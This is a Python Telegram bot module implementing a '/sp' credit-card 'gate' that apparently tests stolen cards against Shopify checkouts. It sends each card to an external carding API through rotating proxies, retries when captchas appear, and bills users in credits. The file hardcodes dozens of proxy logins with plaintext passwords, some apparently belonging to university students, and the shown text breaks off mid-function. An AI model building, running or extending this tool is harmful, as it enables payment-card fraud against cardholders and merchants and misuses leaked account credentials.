from live_emoji import plan_badge, dev_badge
import asyncio
import re
import logging
import aiohttp
import json
import time
import random
import os
from html import escape


from aiogram import types, F, Router
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest


from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

router = Router()


REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

async def get_anime_gif():
    """Fetches a random anime reaction GIF from otakugifs API."""
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"


API_URL = "https://carders2.up.railway.app/shopii"
SITES_FILE = "sites.txt"
MAX_SITE_ROTATIONS = 20

PROXY_LIST = [
    # ── Raw IPs ──
    "103.156.91.173:58798:zqrn9y5d:zQRN9y5d",
    "103.161.113.230:18491:dz46cabj:ksuRcKlNqJMU",
    "103.183.121.128:58122:3dfw7c6x:oSeqx0CNeV0k",
    "103.183.121.211:11657:azqdr5vn:71WCPuMwyc72",
    "103.183.121.59:34219:y7g4dd8d:Buw96jtGFKA5",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "103.204.109.189:12345:tickets:proxyon145",
    "104.160.17.116:12345:tickets:proxyon145",
    "107.150.71.197:12345:tickets:proxyon145",
    "107.150.71.30:12345:tickets:proxyon145",
    "107.172.241.122:12345:tickets:proxyon145",
    "107.173.112.194:12345:tickets:proxyon145",
    "135.148.117.75:59813:oldg6k2r:oLdG6k2R",
    "138.94.218.193:12345:tickets:proxyon145",
    "153.121.71.115:822:socialwire:87xb2kziRk4xa",
    "161.0.1.119:12345:tickets:proxyon145",
    "161.0.1.13:12345:tickets:proxyon145",
    "162.212.170.252:12345:tickets:proxyon145",
    "162.212.170.77:12345:tickets:proxyon145",
    "168.228.46.128:12345:tickets:proxyon145",
    "168.228.46.189:12345:tickets:proxyon145",
    "175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "181.177.102.240:12345:tickets:proxyon145",
    "181.215.16.247:12345:tickets:proxyon145",
    "185.122.170.10:12345:tickets:proxyon145",
    "185.122.170.73:12345:tickets:proxyon145",
    "190.123.219.12:12345:tickets:proxyon145",
    "190.123.219.34:12345:tickets:proxyon145",
    "191.102.165.164:12345:tickets:proxyon145",
    "192.227.238.145:12345:tickets:proxyon145",
    "193.254.17.97:64708:1DnugnypC:4yPtzMd3f",
    "194.33.9.114:64170:nWtrJqsb:RYYEE72Y",
    "194.33.9.136:49520:nWtrJqsb:RYYEE72Y",
    "196.196.23.136:12345:tickets:proxyon145",
    "196.196.23.45:12345:tickets:proxyon145",
    "196.244.48.124:12345:naveed:Qwerty_123ABC",
    "196.244.48.126:12345:naveed:Qwerty_123ABC",
    "196.244.48.26:12345:naveed:Qwerty_123ABC",
    "196.247.205.113:12345:tickets:proxyon145",
    "196.247.205.228:12345:tickets:proxyon145",
    "196.247.205.48:12345:tickets:proxyon145",
    "196.247.205.88:12345:tickets:proxyon145",
    "196.247.205.91:12345:tickets:proxyon145",

    # ── 202.28.17.8 — Thai university pool ──
    "202.28.17.8:8080:s5802016810053:1549900215617",
    "202.28.17.8:8080:s6003026810028:1720800122226",
    "202.28.17.8:8080:s6202052810029:78496978",
    "202.28.17.8:8080:s6301074610292:za0643250344",
    "202.28.17.8:8080:s6402011520288:surikan123",
    "202.28.17.8:8080:s6402013510115:s1609900520681",
    "202.28.17.8:8080:songponp:neung1nakub",

    # ── More raw IPs ──
    "23.104.162.39:12345:tickets:proxyon145",
    "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "45.145.162.63:58536:nWtrJqsb:RYYEE72Y",
    "5.157.5.100:12345:tickets:proxyon145",
    "5.157.5.154:12345:tickets:proxyon145",
    "5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
    "50.3.137.165:12345:tickets:proxyon145",
    "50.3.137.177:12345:tickets:proxyon145",
    "51.195.198.170:36647:fwos7n0b:fWOS7n0B",
    "82.117.94.14:63126:RrkJjUqfT:jYEH6Emdg",

    # ── pvdata.host pool (shared creds) ──
    "ae-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "at-wie.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-bri.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-mel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-per.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "bg-sof.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "br-sao.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ch-zur.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cy-lim.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-fra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "gr-ath.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "im-bal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "in-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "is-rey.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "it-mil.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "kr-seo.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lt-sia.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lu-lux.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mx-mex.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "no-osl.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "rs-bel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-got.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-kis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-sto.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "th-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "tw-tai.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ua-nik.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-lon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-man.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "vn-hoc.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",

    # ── g-w.info free proxies ──
    "ca-free-proxy.g-w.info:59785:diehard33:3liubjnixc8456789i",
    "de-free-proxy.g-w.info:59784:smoothysuck:ublIUnbiybkvDfgg",
    "in-free-proxy.g-w.info:59783:dagandnorb:EdsAbQuamAn999",
    "uk-free-proxy.g-w.info:59782:meetthejack:8ohlsid7hlPenEdsAbQ",
    "us-free-proxy.g-w.info:59781:user3proxyserver:huccuAn_oc7o87hubhjYY",

    # ── University proxies ──
    "authproxy.fju.edu.tw:3128:506061324:enya07141013",
    "proxy.sru.ac.th:8080:6115103001019:1819900293950",
    "proxy.sru.ac.th:8080:64052511005:3820800334521",
    "proxy.sru.ac.th:8080:jantawan.ban:jantawan.ban",
    "proxy.sru.ac.th:8080:patarawan.kah:patarawan.kah",
    "proxy.sru.ac.th:8080:prairat.kon:24122529**",
    "proxy.ttu.edu.tw:3128:g10701005:j0i2m2",

    # ── cactussstp.com — au1 ──
    "au1.cactussstp.com:81:bvmbsmie:shibby2511",
    "au1.cactussstp.com:81:hughmuir2:lisamarie11",
    "au1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "au1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "au1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "au1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "au1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ca1 ──
    "ca1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ch1 ──
    "ch1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:81:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── es1 ──
    "es1.cactussstp.com:81:bvmbsmie:shibby2511",
    "es1.cactussstp.com:81:hughmuir2:lisamarie11",
    "es1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:81:yefprelf:dr2gsmab",
    "es1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "es1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "es1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "es1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "es1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "es1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── in1 ──
    "in1.cactussstp.com:81:bvmbsmie:shibby2511",
    "in1.cactussstp.com:81:hughmuir2:lisamarie11",
    "in1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:81:yefprelf:dr2gsmab",
    "in1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "in1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "in1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "in1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "in1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "in1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── it1 ──
    "it1.cactussstp.com:81:bvmbsmie:shibby2511",
    "it1.cactussstp.com:81:hughmuir2:lisamarie11",
    "it1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "it1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "it1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "it1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── lv1 ──
    "lv1.cactussstp.com:81:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:81:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:81:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── my1 ──
    "my1.cactussstp.com:81:bvmbsmie:shibby2511",
    "my1.cactussstp.com:81:hughmuir2:lisamarie11",
    "my1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "my1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "my1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "my1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "my1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── pt1 ──
    "pt1.cactussstp.com:81:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:81:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:81:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── ro1 ──
    "ro1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ru1 ──
    "ru1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk2 ──
    "uk2.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk3 ──
    "uk3.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us1 ──
    "us1.cactussstp.com:81:bvmbsmie:shibby2511",
    "us1.cactussstp.com:81:hughmuir2:lisamarie11",
    "us1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us2 ──
    "us2.cactussstp.com:81:bvmbsmie:shibby2511",
    "us2.cactussstp.com:81:hughmuir2:lisamarie11",
    "us2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us3 ──
    "us3.cactussstp.com:81:bvmbsmie:shibby2511",
    "us3.cactussstp.com:81:hughmuir2:lisamarie11",
    "us3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us4 ──
    "us4.cactussstp.com:81:bvmbsmie:shibby2511",
    "us4.cactussstp.com:81:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us4.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us4.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us4.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us6 ──
    "us6.cactussstp.com:81:bvmbsmie:shibby2511",
    "us6.cactussstp.com:81:hughmuir2:lisamarie11",
    "us6.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us6.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us6.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us6.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us6.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us9 ──
    "us9.cactussstp.com:81:bvmbsmie:shibby2511",
    "us9.cactussstp.com:81:hughmuir2:lisamarie11",
    "us9.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us9.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us9.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us9.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
]


RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed',
]


CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"


user_last_command_time: dict = {}


def ensure_stats_columns():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"[SP] Error checking stats columns: {e}")

ensure_stats_columns()

def update_user_stats_sync(user_id: int, is_charged: bool):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = ?",
        (user_id,)
    )
    if is_charged:
        cursor.execute(
            "UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = ?",
            (user_id,)
        )
    conn.commit()
    conn.close()

async def get_user_plan_name(user_id: int) -> str:
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _fetch():
                conn = get_db_connection()
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = ? ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                return row["plan"].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_fetch)
        except Exception as e:
            logging.error(f"[SP] Error fetching plan name: {e}")
        return "PREMIUM"
    return "FREE"


def load_sites() -> list:
    try:
        if not os.path.exists(SITES_FILE):
            return []
        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"[SP] Error loading sites: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def build_user_link(user_obj) -> str:
    """Builds a clickable user mention link."""
    name = escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


@router.message(F.text.startswith("/sp"))
async def sp_command(message: types.Message):

    if not await asyncio.to_thread(is_gate_enabled, "sp"):
        await message.reply(
            "🚧 <b>𝗦𝗣 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>",
            parse_mode="HTML"
        )
        return

    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)


    if not is_premium:
        last = user_last_command_time.get(user_id, 0)
        elapsed = current_time - last
        if elapsed < 10:
            remaining = round(10 - elapsed, 1)
            await message.reply(
                f"<tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>Aᴄᴛɪᴠᴇ Cᴏᴏʟᴅᴏᴡɴ !</b>\n\n"
                f"<b>Pʟᴇᴀsᴇ Wᴀɪᴛ <code>{remaining}</code> Sᴇᴄᴏɴᴅs Bᴇғᴏʀᴇ Cᴏɴᴛɪɴᴜɪɴɢ.</b>\n\n"
                f"<tg-emoji emoji-id=\"6136275172283391020\">⭐</tg-emoji> <b>Pᴜʀᴄʜᴀsᴇ Pʀᴇᴍɪᴜᴍ Pʟᴀɴ Fᴏʀ Usᴇ Cᴏᴍᴍᴀɴᴅs Wɪᴛʜᴏᴜᴛ Cᴏᴏʟᴅᴏᴡɴ.</b>",
                parse_mode="HTML"
            )
            return
        user_last_command_time[user_id] = current_time


    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits < 1:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
            "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
            "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
            parse_mode="HTML"
        )
        return


    parts = message.text.split(maxsplit=1)
    raw_text = parts[1].strip() if len(parts) > 1 else ""

    if message.reply_to_message:
        replied = message.reply_to_message
        raw_text += " " + (replied.text or replied.caption or "")

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage:</b> /sp <code>cc|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode="HTML"
        )
        return


    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, raw_text)
    if not match:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Card Format.</b>\n"
            "Please send as <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()
    mm = mm.zfill(2)
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"


    if not luhn_check(cc):
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Card Number</b>\n"
            "Luhn check failed.",
            parse_mode="HTML"
        )
        return


    sites = load_sites()
    if not sites:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> No sites found in <code>sites.txt</code>.",
            parse_mode="HTML"
        )
        return

    plan_name = await get_user_plan_name(user_id)

    escaped_card = escape(formatted_cc)
    proc_msg = await message.reply(
        f"<b>Pʀᴏᴄᴇssɪɴɢ...</b><tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>\n"
        f"<pre><code>{escaped_card}</code></pre>\n"
        f"<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪғʏ 0.98USD</b>\n",
        parse_mode="HTML"
    )

    asyncio.create_task(
        process_sp_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, sites)
    )


async def process_sp_check(
    message: types.Message,
    proc_msg: types.Message,
    user: types.User,
    user_id: int,
    formatted_cc: str,
    cc: str,
    plan_name: str,
    sites: list,
):
    check_started = time.time()
    api_result = {"Response": "UNKNOWN_ERROR"}
    last_site = None

    for _ in range(MAX_SITE_ROTATIONS):

        candidates = [s for s in sites if s != last_site] or sites
        current_site = random.choice(candidates)
        last_site = current_site

        proxy = random.choice(PROXY_LIST)

        try:
            timeout = aiohttp.ClientTimeout(total=45)
            params = {"site": current_site, "cc": formatted_cc, "proxy": proxy}
            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL, params=params, timeout=timeout) as resp:
                    text = await resp.text()
                    try:
                        api_result = json.loads(text)
                    except json.JSONDecodeError:
                        api_result = {"Response": f"PARSE_ERROR"}
        except Exception as e:
